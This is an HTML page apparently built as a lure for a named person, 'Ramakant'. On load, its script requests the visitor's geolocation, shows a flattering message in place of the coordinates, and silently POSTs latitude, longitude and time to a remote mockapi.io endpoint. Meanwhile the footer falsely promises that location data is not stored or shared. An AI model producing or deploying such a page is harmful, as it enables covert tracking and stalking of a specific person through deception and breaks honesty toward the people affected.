<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get My Location</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            width: 100%;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 2rem;
            color: #4CAF50;
        }
        
        .location-btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2rem;
            border-radius: 50px;
            cursor: pointer;
            margin: 1rem 0;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }
        
        .location-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }
        
        .location-btn:active {
            transform: translateY(0);
        }
        
        .location-info {
            margin-top: 2rem;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        
        .coordinates {
            font-size: 1.1rem;
            margin: 10px 0;
        }
        
        .error {
            color: #ff6b6b;
            margin-top: 1rem;
        }
        
        .loading {
            display: none;
            margin-top: 1rem;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #4CAF50;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 3rem;
            color: #666;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üåç Check Much You Know , Ramakant</h1>
        <button class="location-btn" id="getLocation">Click to See Magic</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Fetching your location...</p>
        </div>
        
        <div class="location-info" id="locationInfo" style="display: none;">
            <h2>Hi User:</h2>
            <p class="coordinates" id="coordinates"></p>
        </div>
        
        <div class="error" id="error" style="display: none;"></div>
        
        <div class="footer">
            <p>Your privacy is protected - location data is not stored or shared</p>
        </div>
    </div>

    <script>
    // Replace with your actual MockAPI endpoint
    const API_URL = "https://68ad9624a0b85b2f2cf3e64b.mockapi.io/locations";

    function getLocation() {
        document.getElementById("loading").style.display = "block";
        document.getElementById("error").style.display = "none";
        document.getElementById("locationInfo").style.display = "none";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
            showError({ code: 0, message: "Geolocation not supported" });
        }
    }

    async function showPosition(position) {
        const lat = position.coords.latitude.toString();
        const lon = position.coords.longitude.toString();

        // Update UI
        document.getElementById("loading").style.display = "none";
        document.getElementById("locationInfo").style.display = "block";
        document.getElementById("coordinates").innerText = `You are best Person.`;

        // Send to MockAPI (match schema)
        try {
            const response = await fetch(API_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    lat: lat,
                    long: lon,
                    createdAt: new Date().toISOString()
                })
            });

            if (!response.ok) throw new Error("Failed to save location");
            const savedData = await response.json();
            console.log("‚úÖ Location saved:", savedData);
        } catch (err) {
            document.getElementById("error").style.display = "block";
            document.getElementById("error").innerText = "‚ö†Ô∏è Could not save location: " + err.message;
        }
    }

    function showError(error) {
        document.getElementById("loading").style.display = "none";
        document.getElementById("error").style.display = "block";

        switch (error.code) {
            case error.PERMISSION_DENIED:
                document.getElementById("error").innerText = "User denied the request for Geolocation.";
                break;
            case error.POSITION_UNAVAILABLE:
                document.getElementById("error").innerText = "Location information is unavailable.";
                break;
            case error.TIMEOUT:
                document.getElementById("error").innerText = "The request to get user location timed out.";
                break;
            default:
                document.getElementById("error").innerText = "An unknown error occurred.";
        }
    }
    getLocation();
   // document.getElementById("getLocation").addEventListener("click", getLocation);
</script>
</body>
</html>
